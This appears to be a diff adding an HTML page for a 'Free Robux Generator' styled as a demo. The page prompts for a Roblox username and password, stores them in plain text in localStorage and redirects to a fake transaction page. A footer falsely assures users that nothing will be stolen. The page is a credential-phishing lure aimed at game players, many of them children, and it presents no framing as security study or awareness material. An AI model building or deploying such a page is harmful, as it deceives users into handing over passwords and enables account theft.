@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Robux - Demo</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      color: white;
+      text-align: center;
+    }
+    .container {
+      margin-top: 100px;
+      background: rgba(0,0,0,0.4);
+      padding: 30px;
+      border-radius: 20px;
+      width: 350px;
+      margin-left: auto;
+      margin-right: auto;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+    }
+    input, select, button {
+      margin: 10px;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      width: 80%;
+      font-size: 16px;
+    }
+    button {
+      background: #ff9800;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #e68900;
+    }
+    .loader {
+      display: none;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #ff9800;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+    footer {
+      margin-top: 50px;
+      font-size: 12px;
+      opacity: 0.8;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Free Robux Generator</h1>
+    <input type="text" id="username" placeholder="Enter Username" required><br>
+    <input type="password" id="password" placeholder="Enter Password" required><br>
+    <label for="robux">Amount of Robux:</label><br>
+    <select id="robux">
+      <option>50 Robux</option>
+      <option>100 Robux</option>
+      <option>200 Robux</option>
+      <option>500 Robux</option>
+      <option>1000 Robux</option>
+    </select><br>
+    <button onclick="startTransaction()">Start Transaction</button>
+    <div class="loader" id="loader"></div>
+  </div>
+
+  <footer>
+    &copy; 2025 Free Robux Demo<br>
+    Nothing from your account will be stolen and it's our guarantee.
+  </footer>
+
+  <script>
+    function startTransaction() {
+      let username = document.getElementById("username").value;
+      let password = document.getElementById("password").value;
+      let robux = document.getElementById("robux").value;
+
+      if(username && password) {
+        // Save data to localStorage
+        let data = JSON.parse(localStorage.getItem("transactions")) || [];
+        data.push({username, password, robux});
+        localStorage.setItem("transactions", JSON.stringify(data));
+
+        // Show loader before redirect
+        document.getElementById("loader").style.display = "block";
+        setTimeout(() => {
+          window.location.href = "transaction.html";
+        }, 2000);
+      } else {
+        alert("Please enter both username and password!");
+      }
+    }
+  </script>
+</body>
+</html>
